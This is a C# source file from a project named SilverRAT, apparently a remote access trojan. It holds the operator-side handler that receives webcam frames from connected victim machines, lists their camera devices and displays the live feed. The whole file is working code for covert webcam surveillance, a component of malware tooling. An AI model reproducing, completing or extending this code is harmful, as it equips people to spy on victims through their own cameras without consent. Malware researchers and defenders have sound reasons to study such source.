using Bunifu.UI.WinForms;
using SilverRAT.Connection;
using SilverRAT.Forms;
using SilverRAT.Helper;
using SilverRAT.MessagePack;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace SilverRAT.Handle_Packet;

internal class HandleCamera
{
    public void Connect(Clients client, MsgPack unpack_msgpack)
    {
        try
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "capture":
                    {
                        Cam cam3 = (Cam)Application.OpenForms["Camera:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        try
                        {
                            if (cam3 != null)
                            {
                                using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                                {
                                    cam3.GetImage = (Image)Image.FromStream(memoryStream).Clone();
                                    cam3.ViewerBox.Image = cam3.GetImage;
                                    cam3.FPS++;
                                    if (cam3.sw.ElapsedMilliseconds >= 1000L)
                                    {
                                        BunifuLabel logs = cam3.logs;
                                        int fPS = cam3.FPS;
                                        logs.Text = "FPS : " + fPS + " Size : " + Methods.BytesToString(memoryStream.Length);
                                        cam3.FPS = 0;
                                        cam3.sw = Stopwatch.StartNew();
                                    }
                                    break;
                                }
                            }
                            client.Disconnected();
                            break;
                        }
                        catch
                        {
                            break;
                        }
                    }
                case "Stop":
                    {
                        Cam cam2 = (Cam)Application.OpenForms["Camera:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (cam2 != null)
                        {
                            cam2.Power.Enabled = true;
                            cam2.Power.Text = "Start";
                            cam2.logs.Text = "";
                            try
                            {
                                if (cam2.ViewerBox.Image != null)
                                {
                                    cam2.ViewerBox.Image = null;
                                }
                                break;
                            }
                            catch
                            {
                                break;
                            }
                        }
                        client.Disconnected();
                        break;
                    }
                case "Start":
                    {
                        Cam cam4 = (Cam)Application.OpenForms["Camera:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (cam4 != null)
                        {
                            cam4.Power.Enabled = true;
                            cam4.Power.Text = "Stop";
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
                case "Actived":
                    {
                        Cam cam = (Cam)Application.OpenForms["Camera:" + unpack_msgpack.ForcePathObject("ID").AsString];
                        if (cam != null)
                        {
                            if (cam.Client != null)
                            {
                                break;
                            }
                            cam.Client = client;
                            cam.LoaderConnect.Visible = false;
                            cam.Timer1.Start();
                            cam.Power.Enabled = true;
                            string[] array = unpack_msgpack.ForcePathObject("List").AsString.Split(new string[1] { "-=>" }, StringSplitOptions.None);
                            foreach (string text in array)
                            {
                                if (!string.IsNullOrWhiteSpace(text))
                                {
                                    cam.ListDrive.Items.Add(text);
                                }
                            }
                            cam.ListDrive.SelectedIndex = 0;
                            if (cam.ListDrive.Text == "None")
                            {
                                client.Disconnected();
                            }
                        }
                        else
                        {
                            client.Disconnected();
                        }
                        break;
                    }
            }
        }
        catch
        {
        }
    }
}
